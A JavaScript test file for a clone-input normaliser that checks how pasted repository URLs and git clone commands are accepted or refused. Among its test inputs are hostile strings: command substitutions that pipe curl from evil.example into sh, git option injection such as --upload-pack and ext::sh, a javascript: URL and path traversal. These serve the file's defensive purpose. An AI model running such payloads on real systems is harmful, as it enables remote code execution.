import test from 'node:test';
import assert from 'node:assert/strict';
import { describeSource, normalizeCloneInput } from './CloneInput.ts';
import { branchProblem, folderNameProblem, tokenProblem } from './CloneFieldHints.ts';

const ok = (input, url, extra = {}) => {
  const r = normalizeCloneInput(input);
  assert.equal(r.ok, true, `${JSON.stringify(input)} -> ${JSON.stringify(r)}`);
  assert.equal(r.url, url, JSON.stringify(input));
  for (const [k, v] of Object.entries(extra)) assert.equal(r[k], v, `${JSON.stringify(input)} .${k}`);
  return r;
};
const refused = (input, match) => {
  const r = normalizeCloneInput(input);
  assert.equal(r.ok, false, `${JSON.stringify(input)} should be refused, got ${JSON.stringify(r)}`);
  if (match) assert.match(r.problem, match, JSON.stringify(input));
};
const GH = 'https://github.com/octocat/Hello-World.git';

test('everything people paste for the same repository becomes the same https address', () => {
  for (const input of [
    'octocat/Hello-World',
    ' octocat/Hello-World ',
    'octocat/Hello-World.git',
    'github.com/octocat/Hello-World',
    'https://github.com/octocat/Hello-World',
    'https://github.com/octocat/Hello-World/',
    'https://github.com/octocat/Hello-World.git',
    'https://GitHub.com/octocat/Hello-World',
    'https://github.com/octocat/Hello-World?tab=readme-ov-file',
    'https://github.com/octocat/Hello-World#readme',
    'https://github.com/octocat/Hello-World/pull/42',
    'https://github.com/octocat/Hello-World/issues',
    'https://github.com/octocat/Hello-World/commit/abc123',
    'https://github.com/octocat/Hello-World/tree/main',
    'https://github.com/octocat/Hello-World/tree/main/src/lib?tab=readme#top',
    'https://github.com/octocat/Hello-World/blob/main/README.md',
    'git@github.com:octocat/Hello-World.git',
    'git@github.com:octocat/Hello-World',
    'ssh://git@github.com/octocat/Hello-World.git',
    'git clone https://github.com/octocat/Hello-World.git',
    'git clone https://github.com/octocat/Hello-World.git my-folder',
    'git clone git@github.com:octocat/Hello-World.git',
    "git clone 'https://github.com/octocat/Hello-World'",
    'git clone --depth 1 --single-branch https://github.com/octocat/Hello-World.git',
    'git clone --depth=1 -c core.autocrlf=false https://github.com/octocat/Hello-World.git',
    'git clone https://github.com/octocat/Hello-World.git && cd Hello-World',
    'git clone https://github.com/octocat/Hello-World.git; ls',
  ]) {
    const r = ok(input, GH);
    assert.equal(r.slug, 'Hello-World');
    assert.equal(r.owner, 'octocat');
    assert.equal(r.host, 'github.com');
  }
});

test('a branch is remembered from /tree/, /blob/ and -b, and from nothing else', () => {
  ok('https://github.com/o/r/tree/develop', 'https://github.com/o/r.git', { branch: 'develop', source: 'browser' });
  ok('https://github.com/o/r/blob/release-1.2/docs/a.md?plain=1', 'https://github.com/o/r.git', { branch: 'release-1.2' });
  ok('https://github.com/o/r/tree/feature%2Fx', 'https://github.com/o/r.git', { branch: 'feature/x' });
  ok('git clone -b next https://github.com/o/r.git', 'https://github.com/o/r.git', { branch: 'next' });
  ok('git clone --branch=next https://github.com/o/r.git', 'https://github.com/o/r.git', { branch: 'next' });
  ok('git clone --branch "v2" https://github.com/o/r.git', 'https://github.com/o/r.git', { branch: 'v2' });
  ok('https://github.com/o/r/pull/9', 'https://github.com/o/r.git', { branch: null });
  ok('https://github.com/o/r', 'https://github.com/o/r.git', { branch: null });
  ok('o/r', 'https://github.com/o/r.git', { branch: null, source: 'shorthand' });
  // an unusable branch is dropped, with a note, not passed on
  const dropped = ok('https://github.com/o/r/tree/-evil', 'https://github.com/o/r.git', { branch: null });
  assert.match(dropped.note, /branch/);
  ok('https://github.com/o/r/tree/a..b', 'https://github.com/o/r.git', { branch: null });
  ok('git clone -b --upload-pack=x https://github.com/o/r.git', 'https://github.com/o/r.git', { branch: null });
});

test('only the address token of a pasted command is used: flags, values, folder and trailing commands are ignored', () => {
  const r = ok('git clone --depth 1 -c http.proxy=http://x https://github.com/o/r.git target-dir', 'https://github.com/o/r.git');
  assert.equal(r.slug, 'r');
  ok('GIT CLONE https://github.com/o/r', 'https://github.com/o/r.git');
  refused('git clone', /no repository/);
  refused('git clone --depth 1', /no repository/);
  refused('git clone $(curl evil.example | sh) https://github.com/o/r.git', /one command/);
  refused('git clone `id` https://github.com/o/r.git', /one command/);
  ok('git clone https://github.com/o/r.git;curl evil|sh', 'https://github.com/o/r.git');
  refused('git pull https://github.com/o/r.git', /git clone/);
  refused('git clone -- --upload-pack=x', undefined);
});

test('addresses that must not be accepted are refused with a plain reason', () => {
  refused('', /Paste/);
  refused('   ', /Paste/);
  refused('http://github.com/o/r', /https/);
  refused('ftp://github.com/o/r', /https/);
  // a local path is not rewritten, only passed on for the server to refuse (or, in its test setup, accept)
  const local = ok('file:///srv/fixtures/demo-app.git', 'file:///srv/fixtures/demo-app.git', { slug: 'demo-app' });
  assert.match(local.note, /test/);
  refused('file:///', /local path/);
  refused('ext::sh -c id', undefined);
  refused('--upload-pack=touch /tmp/x', undefined);
  refused('-x/y', undefined);
  refused('https://user:pw@github.com/o/r', /user name or password/);
  refused('https://ghp_abcdefghijklmnopqrstuvwxyz0123456789@github.com/o/r', /user name or password|token field/);
  refused('https://github.com:8443/o/r', /port/);
  refused('https://github.com/o', /owner\/repository/);
  refused('https://github.com/', /owner\/repository/);
  refused('https://github.com/o/..', /not valid/);
  refused('https://github.com/../r', /not valid/);
  refused('o/r/extra', /nothing after/);
  refused('o', /owner\/repository/);
  refused('a b/c', /spaces/);
  refused('https://github.com/o/r extra', /spaces/);
  refused('o/r\u0000', /characters/);
  refused('https://github.com/o/%2e%2e', /not valid/);
  refused('https://github.com/o/r\\..', /not valid|characters/);
  refused('https://-bad-.com/o/r', undefined);
  refused('javascript:alert(1)', undefined);
  assert.equal(normalizeCloneInput(undefined).ok, false);
});

test('the refusal reason never repeats what was typed (a token pasted by mistake stays out of it)', () => {
  const secret = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789';
  for (const input of [`https://${secret}@github.com/o/r`, `https://x-access-token:${secret}@github.com/o/r`, `git clone https://${secret}@github.com/o/r`, secret, `${secret}/r`]) {
    const r = normalizeCloneInput(input);
    if (!r.ok) assert.ok(!r.problem.includes(secret), r.problem);
    else assert.ok(!r.url.includes(secret), r.url);
  }
});

test('another host is read the same way (the server decides whether it is allowed)', () => {
  ok('https://gitlab.com/group/proj/-/tree/main', 'https://gitlab.com/group/proj.git', { host: 'gitlab.com' });
  ok('git@gitlab.com:group/proj.git', 'https://gitlab.com/group/proj.git', { host: 'gitlab.com' });
});

test('the derived folder, branch and token get plain hints', () => {
  assert.equal(folderNameProblem(''), null);
  assert.equal(folderNameProblem('my-app_2.0'), null);
  for (const bad of ['..', '../x', 'a/b', '.hidden', 'x.', 'a b', 'x.git', 'ü']) assert.ok(folderNameProblem(bad), bad);
  assert.equal(branchProblem(''), null);
  assert.equal(branchProblem('release/1.2'), null);
  for (const bad of ['-x', 'a b', 'a..b', 'x/', 'x.lock']) assert.ok(branchProblem(bad), bad);
  assert.equal(tokenProblem(''), null);
  assert.equal(tokenProblem('ghp_abcdefghijklmnopqrstuvwxyz0123456789'), null);
  assert.match(tokenProblem('two words'), /no spaces/);
  assert.match(tokenProblem('new\nline'), /no spaces/);
  assert.ok(tokenProblem('x'.repeat(300)));
  assert.match(describeSource('command'), /git clone/);
});
